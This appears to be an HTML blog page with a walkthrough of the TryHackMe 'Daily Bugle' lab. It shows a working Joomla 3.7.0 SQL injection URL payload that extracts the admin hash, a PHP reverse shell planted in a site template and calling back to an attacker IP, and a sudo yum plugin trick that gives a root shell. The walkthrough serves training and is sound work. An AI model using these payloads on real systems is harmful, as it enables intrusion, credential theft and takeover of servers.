@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Daily Bugle | JackHacksStuff</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --accent:     #ff3b6f;
+    --accent-rgb: 255,59,111;
+    --bg:       #090b0e;
+    --surface:  #0e1116;
+    --surface2: #131820;
+    --border:   #1c2330;
+    --border2:  #26303f;
+    --blue:     #7b9cff;
+    --text:     #c5d4e8;
+    --muted:    #48586e;
+    --muted2:   #6b7f97;
+    --mono:     'IBM Plex Mono', monospace;
+    --sans:     'Syne', sans-serif;
+    --rail:     48px;
+    --content:  720px;
+  }
+
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+    opacity: 0.025;
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .rail {
+    position: fixed;
+    top: 0; left: 0;
+    width: var(--rail);
+    height: 100vh;
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 1.5rem 0;
+    z-index: 100;
+    background: var(--bg);
+  }
+
+  .rail-logo {
+    writing-mode: vertical-rl;
+    transform: rotate(180deg);
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: 0.7rem;
+    letter-spacing: 0.15em;
+    color: #fff;
+    white-space: nowrap;
+    text-decoration: none;
+    margin-bottom: auto;
+  }
+
+  .rail-logo span { color: var(--accent); }
+
+  .rail-toc {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0;
+    margin: 2rem 0;
+    overflow: hidden;
+  }
+
+  .rail-line { width: 1px; flex: 1; background: var(--border); }
+
+  .rail-tick {
+    width: 6px; height: 1px;
+    background: var(--border2);
+    flex-shrink: 0;
+    transition: background 0.3s;
+    cursor: pointer;
+  }
+
+  .rail-tick.active { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
+
+  .rail-bottom {
+    font-size: 0.6rem;
+    color: var(--muted);
+    writing-mode: vertical-rl;
+    transform: rotate(180deg);
+    letter-spacing: 0.1em;
+  }
+
+  main { margin-left: var(--rail); }
+
+  nav {
+    position: sticky;
+    top: 0; z-index: 90;
+    background: rgba(9,11,14,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 3rem;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .nav-back {
+    font-size: 0.75rem;
+    color: var(--muted2);
+    text-decoration: none;
+    letter-spacing: 0.08em;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    transition: color 0.2s;
+  }
+
+  .nav-back:hover { color: var(--accent); }
+
+  .nav-meta {
+    font-size: 0.7rem;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 1.5rem;
+  }
+
+  .nav-badge {
+    font-size: 0.6rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 0.15rem 0.5rem;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+  }
+
+  .wu-header {
+    padding: 5rem 3rem 3.5rem;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .wu-header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--border) 1px, transparent 1px),
+      linear-gradient(90deg, var(--border) 1px, transparent 1px);
+    background-size: 60px 60px;
+    opacity: 0.3;
+    mask-image: radial-gradient(ellipse 70% 100% at 90% 50%, black 0%, transparent 100%);
+  }
+
+  .wu-header::after {
+    content: '';
+    position: absolute;
+    bottom: -1px; left: 3rem;
+    width: 80px; height: 1px;
+    background: var(--accent);
+    box-shadow: 0 0 12px rgba(var(--accent-rgb), 0.6);
+  }
+
+  .wu-eyebrow {
+    font-size: 0.65rem;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 1.25rem;
+    position: relative;
+  }
+
+  .wu-title {
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: clamp(2.5rem, 7vw, 5rem);
+    color: #fff;
+    line-height: 0.95;
+    letter-spacing: -0.02em;
+    position: relative;
+    margin-bottom: 2rem;
+  }
+
+  .wu-meta-row {
+    display: flex;
+    gap: 2rem;
+    flex-wrap: wrap;
+    position: relative;
+  }
+
+  .wu-meta-item {
+    display: flex;
+    flex-direction: column;
+    gap: 0.25rem;
+  }
+
+  .wu-meta-label {
+    font-size: 0.6rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .wu-meta-value {
+    font-size: 0.8rem;
+    color: var(--text);
+  }
+
+  .wu-meta-value.accent { color: var(--accent); }
+
+  .tool-row {
+    display: flex;
+    gap: 0.4rem;
+    flex-wrap: wrap;
+    padding: 1.25rem 3rem;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+  }
+
+  .tool-tag {
+    font-size: 0.62rem;
+    letter-spacing: 0.06em;
+    color: var(--muted2);
+    background: var(--border);
+    padding: 0.2rem 0.5rem;
+  }
+
+  .wu-body {
+    max-width: calc(var(--content) + 6rem);
+    padding: 4rem 3rem;
+    margin: 0 auto;
+  }
+
+  .wu-body h2 {
+    font-family: var(--mono);
+    font-weight: 500;
+    font-size: 0.78rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin: 3rem 0 1.25rem;
+    padding-top: 3rem;
+    border-top: 1px solid var(--border);
+    scroll-margin-top: 80px;
+  }
+
+  .wu-body h2:first-child { margin-top: 0; padding-top: 0; border-top: none; }
+
+  .wu-body h3 {
+    font-family: var(--sans);
+    font-weight: 700;
+    font-size: 1rem;
+    color: #fff;
+    margin: 1.5rem 0 0.75rem;
+  }
+
+  .wu-body p {
+    font-size: 0.82rem;
+    color: var(--muted2);
+    line-height: 2;
+    margin-bottom: 1rem;
+  }
+
+  .wu-body p strong { color: var(--text); font-weight: 500; }
+  .wu-body p code {
+    background: var(--surface);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+  .wu-body ol, .wu-body ul {
+    font-size: 0.82rem;
+    color: var(--muted2);
+    line-height: 2;
+    margin-bottom: 1rem;
+    padding-left: 1.5rem;
+  }
+
+  .wu-body ol li, .wu-body ul li {
+    margin-bottom: 0.5rem;
+  }
+
+  .wu-body ol li strong, .wu-body ul li strong {
+    color: var(--text);
+    font-weight: 500;
+  }
+
+  .wu-body ol code, .wu-body ul code {
+    background: var(--surface);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+  .wu-body pre {
+    background: var(--surface);
+    border-left: 2px solid var(--accent);
+    padding: 1rem 1.25rem;
+    overflow-x: auto;
+    margin: 1rem 0;
+    font-size: 0.76rem;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  .wu-body pre code {
+    background: none;
+    padding: 0;
+    color: inherit;
+    border: none;
+    font-size: inherit;
+  }
+
+  .flag-box {
+    background: var(--surface);
+    border: 1px solid var(--accent);
+    padding: 0.85rem 1.25rem;
+    margin: 1.25rem 0;
+    display: flex;
+    flex-direction: column;
+    gap: 0.3rem;
+  }
+
+  .flag-box .flag-label {
+    font-size: 0.62rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .flag-box .flag-value {
+    color: var(--accent);
+    font-size: 0.82rem;
+    word-break: break-all;
+  }
+
+  .takeaway {
+    background: rgba(var(--accent-rgb), 0.04);
+    border-left: 2px solid var(--accent);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted2);
+    line-height: 1.8;
+  }
+
+  .takeaway strong { color: var(--text); font-weight: 500; }
+
+  .dead-end {
+    background: rgba(255,255,255,0.02);
+    border-left: 2px solid var(--border2);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted);
+    line-height: 1.8;
+  }
+
+  .dead-end::before {
+    content: '✗ dead end — ';
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 0.3rem;
+    color: var(--muted);
+  }
+
+  .note {
+    background: rgba(123,156,255,0.04);
+    border-left: 2px solid var(--blue);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted2);
+    line-height: 1.8;
+  }
+
+  .note strong { color: #9fb8ff; font-weight: 500; }
+
+  figure {
+    margin: 1.5rem 0;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  figure img {
+    width: 100%;
+    display: block;
+  }
+
+  figcaption {
+    padding: 0.5rem 1rem;
+    font-size: 0.7rem;
+    color: var(--muted);
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+  }
+
+  figcaption code {
+    background: var(--bg);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+  .wu-footer {
+    border-top: 1px solid var(--border);
+    margin: 0 3rem;
+    padding: 2.5rem 0;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1rem;
+  }
+
+  .footer-nav-link {
+    display: flex;
+    flex-direction: column;
+    gap: 0.3rem;
+    text-decoration: none;
+    max-width: 220px;
+  }
+
+  .footer-nav-label {
+    font-size: 0.62rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .footer-nav-title {
+    font-family: var(--sans);
+    font-weight: 700;
+    font-size: 0.9rem;
+    color: var(--muted2);
+    transition: color 0.2s;
+  }
+
+  .footer-nav-link:hover .footer-nav-title { color: var(--accent); }
+
+  .footer-nav-link.next { text-align: right; }
+
+  .footer-center {
+    font-size: 0.7rem;
+    color: var(--muted);
+  }
+
+  .footer-center a {
+    color: var(--muted2);
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+
+  .footer-center a:hover { color: var(--accent); }
+
+  @media (max-width: 768px) {
+    :root { --rail: 0px; }
+    .rail { display: none; }
+    main { margin-left: 0; }
+    nav, .wu-header, .tool-row { padding-left: 1.5rem; padding-right: 1.5rem; }
+    .wu-body { padding: 2.5rem 1.5rem; }
+    .wu-footer { margin: 0 1.5rem; }
+    .wu-title { font-size: 2.5rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="joomla"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="exploit"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="shell"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="lateral"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="takeaways"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Hard</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge">Hard</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · web exploitation · privilege escalation</div>
+    <h1 class="wu-title">Daily Bugle</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-07-18</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent">Hard</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">2</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">Joomla 3.7.0</span>
+    <span class="tool-tag">SQL injection</span>
+    <span class="tool-tag">SSH</span>
+    <span class="tool-tag">sudo yum</span>
+    <span class="tool-tag">GTFOBins</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>Daily Bugle</strong> is a TryHackMe room based on the famous Spider-Man newspaper. The machine runs an old  version of Joomla that is open to SQL injection. This leads to discovering credential and escalating privileges using <code>yum</code>.</p>
+    <p>The room is rated <strong>Hard</strong> and includes:</p>
+    <ul>
+      <li>Enumerating a Joomla CMS</li>
+      <li>Exploiting CVE-2017-8917 (SQL injection)</li>
+      <li>Extracting admin credentials</li>
+      <li>Gaining a reverse shell by editing a Joomla template</li>
+      <li>Moving laterally to SSH with found credentials</li>
+      <li>Escalating privileges using GTFOBins and <code>yum</code></li>
+    </ul>
+
+    <h2 id="recon">// Phase 1: Reconnaissance</h2>
+
+    <p>We begin with a standard Nmap scan. The <code>-sC</code> flag runs default scripts, <code>-sV</code> detects versions, and <code>-p-</code> scans all 65,535 ports.</p>
+
+    <pre>nmap -sC -sV -p- &lt;target_ip&gt;</pre>
+
+    <p>The results show three open ports:</p>
+
+    <pre>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
+80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+3306/tcp open  mysql   MariaDB (unauthorized)
+
+| http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries
+| /joomla/administrator/ /administrator/ /bin/ /cache/ ...</pre>
+
+    <p>When we visit the site on port 80, we see a Joomla-powered homepage for <strong>The Daily Bugle</strong> with a headline about <em>Spider-Man robs bank</em>. The <code>robots.txt</code> file confirms the Joomla installation and shows the <code>/administrator</code> path.</p>
+
+    <figure>
+      <img src="images/daily-bugle/homepage.png" alt="The Daily Bugle homepage shows the Spider-Man robs bank headline">
+      <figcaption><em>Figure 1: The Daily Bugle homepage — the headline <code>"Spider-Man robs bank!"</code> is our first clue.</em></figcaption>
+    </figure>
+
+    <h2 id="joomla">// Phase 2: Joomla Enumeration</h2>
+
+    <p>To confirm the exact version, we perform directory enumeration for common Joomla files. Many CMS installations leave <code>README.txt</code>, <code>LICENSE.txt</code>, or <code>CHANGELOG.txt</code> accessible. We run:</p>
+
+    <pre>gobuster dir -u http://&lt;target_ip&gt;/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt</pre>
+
+    <p>Gobuster finds <code>/README.txt</code>. We fetch it:</p>
+
+    <pre>curl http://&lt;target_ip&gt;/README.txt</pre>
+
+    <p>The file shows <strong>Joomla! 3.7.0</strong>:</p>
+
+    <pre>This is a Joomla! installation/upgrade package to version 3.x
+Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history</pre>
+
+    <p>This version is known to have a vulnerability: <strong>CVE-2017-8917</strong>, an SQL injection vulnerability in the <code>com_fields</code> component.</p>
+
+    <div class="note">
+      <strong>Version disclosure:</strong> Always check for <code>README.txt</code>, <code>CHANGELOG.txt</code>, and <code>LICENSE.txt</code> during enumeration. They are often left exposed and reveal exact versions.
+    </div>
+
+    <h2 id="exploit">// Phase 3: SQL Injection & Credential Extraction</h2>
+
+    <p>We use the exploit from <code>searchsploit</code>:</p>
+
+    <pre>searchsploit joomla 3.7.0</pre>
+
+    <p>The relevant exploit is <strong>42033.txt</strong>, which details an XPATH-based error injection in the <code>com_fields</code> component.</p>
+
+    <h3>Finding the Table Prefix</h3>
+
+    <p>Joomla uses a random table prefix, like <code>fb9j5_</code> or <code>jos_</code>, but also supports the placeholder <code>#__</code>. The CMS replaces with the actual prefix at runtime. We can use <code>%23__users</code> (URL-encoded <code>#__users</code>) directly in our payloads without needing to find the real prefix.</p>
+
+    <div class="note">
+      <strong>Why <code>%23</code>?</strong> The <code>#</code> character is used for URL fragments, so it must be URL-encoded as <code>%23</code> to be read correctly in the SQL query.
+    </div>
+
+    <h3>Extracting the Admin Hash</h3>
+
+    <p>The vulnerable parameter is <code>list[fullordering]</code>. We use an XPATH-based payload to extract the admin's username and password hash:</p>
+
+    <pre>http://&lt;target_ip&gt;/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x3a,(SELECT concat(username,0x3a,password) FROM %23__users LIMIT 0,1),0x3a),1)</pre>
+
+    <p>The error response shows the admin's username and a bcrypt hash:</p>
+
+    <div class="note">
+      <strong>Extracted:</strong> <code>admin_username:[HASH]</code>
+    </div>
+
+    <p>The XPATH error has a character limit, so long hashes get cut off. We use <code>SUBSTRING</code> to get the hash in parts:</p>
+
+    <pre>http://&lt;target_ip&gt;/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x3a,(SELECT SUBSTRING(password,1,30) FROM %23__users WHERE username=0x[HEX_USERNAME]),0x3a),1)</pre>
+
+    <div class="note">
+      <strong>Why hex for the username?</strong> Using <code>0x[HEX_USERNAME]</code> avoids problems with quote escaping in the SQL query. For example, <code>jonah</code> becomes <code>0x6a6f6e6168</code>.
+    </div>
+
+    <p>We repeat this for characters 31-60 to obtain the complete hash.</p>
+
+    <div class="takeaway">
+      <strong>Extracting the full hash:</strong> We concatenate the two halves to form the complete bcrypt hash. While we could crack it with <code>john</code> or <code>hashcat</code>, bcrypt is designed to be slow. Instead, we try contextually relevant passwords. In this situation, the room's theme gives us a strong clue.
+    </div>
+
+    <figure>
+      <img src="images/daily-bugle/joomla-admin.png" alt="Joomla admin dashboard after logging in as jonah">
+      <figcaption><em>Figure 2: Joomla admin dashboard after logging in as <code>jonah</code>.</em></figcaption>
+    </figure>
+
+    <h2 id="shell">// Phase 4: Reverse Shell</h2>
+
+    <p>In the Joomla admin panel, we go to <strong>Extensions</strong>, then <strong>Templates</strong>, and select the <strong>Protostar</strong> template. We open <code>index.php</code> and add a reverse shell:</p>
+
+    <pre>&lt;?php
+$ip = "&lt;attacker_ip&gt;";
+$port = 4444;
+$sock = fsockopen($ip, $port);
+$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?&gt;</pre>
+
+    <p>Next, we set up a listener on our machine:</p>
+
+    <pre>nc -lvnp 4444</pre>
+
+    <p>After that, we visit the site's homepage to trigger the shell. We establish a connection as the <code>apache</code> user.</p>
+
+    <figure>
+      <img src="images/daily-bugle/template-editor.png" alt="Joomla Protostar template index.php editor with reverse shell code inserted">
+      <figcaption><em>Figure 3: Injecting the reverse shell into the <code>index.php</code> template file.</em></figcaption>
+    </figure>
+
+    <h2 id="lateral">// Phase 5: Lateral Movement</h2>
+
+    <p>Our reverse shell places us in <code>/var/www/html</code> as the <code>apache</code> user. We list the directory contents:</p>
+
+    <pre>ls -la</pre>
+
+    <p>Among the files, we see <code>configuration.php</code>, which is the Joomla configuration file. We read it:</p>
+
+    <pre>cat configuration.php</pre>
+
+    <p>The file contains database credentials:</p>
+
+    <div class="note">
+      <strong>Extracted:</strong> <code>root / [PASSWORD]</code>
+    </div>
+
+    <p>Next, we check for other users on the system:</p>
+
+    <pre>ls /home</pre>
+
+    <p>This reveals a user named <code>jjameson</code>, who is J. Jonah Jameson, the editor-in-chief of the Daily Bugle.</p>
+
+    <p>We try the database password for the <code>jjameson</code> account via SSH:</p>
+
+    <pre>ssh jjameson@&lt;target_ip&gt;
+Password: [PASSWORD]
+
+[jjameson@dailybugle ~]$ ls
+user.txt
+
+[jjameson@dailybugle ~]$ cat user.txt</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">User Flag</span>
+      <span class="flag-value">27a2...</span>
+    </div>
+
+    <h2 id="privesc">// Phase 6: Privilege Escalation</h2>
+
+    <p>As <code>jjameson</code>, we check sudo permissions:</p>
+
+    <pre>sudo -l</pre>
+
+    <p>We find that <code>jjameson</code> can run <code>/usr/bin/yum</code> as root without a password:</p>
+
+    <pre>User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum</pre>
+
+    <p>Looking at <strong>GTFOBins</strong>, we find a way to escalate via <code>yum</code>. We create a temporary directory and a plugin that runs a shell:</p>
+
+    <pre>TF=$(mktemp -d)
+cat &gt;$TF/x &lt;&lt;EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat &gt;$TF/y.conf &lt;&lt;EOF
+[main]
+enabled=1
+EOF
+
+cat &gt;$TF/y.py &lt;&lt;EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+    os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y</pre>
+
+    <div class="takeaway">
+      <strong>How it works:</strong> Yum loads Python plugins from the specified directory. Our plugin defines an <code>init_hook</code> that replaces the process with <code>/bin/sh</code>, effectively spawning a root shell.
+    </div>
+
+    <p>This drops us into a <strong>root shell</strong>:</p>
+
+    <pre>sh-4.2# whoami
+root
+sh-4.2# cat /root/root.txt</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">Root Flag</span>
+      <span class="flag-value">eec3...</span>
+    </div>
+
+    <div class="takeaway">
+      <strong>GTFOBins is a crucial resource.</strong> <code>yum</code> is a common way to escalate when you have sudo rights. The plugin method works on most systems.
+    </div>
+
+    <h2 id="takeaways">// Key Takeaways</h2>
+
+    <div class="takeaway">
+      <strong>Joomla 3.7.0 is vulnerable.</strong> The SQL injection in <code>com_fields</code> is well-known and easy to exploit. Always check for CVEs during enumeration.
+    </div>
+
+    <div class="takeaway">
+      <strong>GTFOBins is very helpful.</strong> If you have sudo rights on <code>yum</code>, <code>apt</code>, or other common programs, there is usually a way to escalate privileges.
+    </div>
+
+    <div class="takeaway">
+      <strong>Context is important for passwords.</strong> Passwords that fit the context, like the theme of the room, often lead to quick wins. Don't underestimate weak, obvious credentials.
+    </div>
+
+    <div class="takeaway">
+      <strong>Full attack chain:</strong> Web exploit, reverse shell, credential discovery, lateral movement, privilege escalation. This room is a great example of a realistic penetration test.
+    </div>
+
+  </div>
+
+  <div class="wu-footer">
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="dodge.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Dodge</span>
+    </a>
+  </div>
+
+</main>
+
+<script>
+  const headings = document.querySelectorAll('.wu-body h2[id]');
+  const ticks = document.querySelectorAll('.rail-tick[data-heading]');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        ticks.forEach(t => t.classList.toggle('active', t.dataset.heading === id));
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+
+  headings.forEach(h => observer.observe(h));
+
+  ticks.forEach(tick => {
+    tick.addEventListener('click', () => {
+      const target = document.getElementById(tick.dataset.heading);
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
+</body>
+</html>
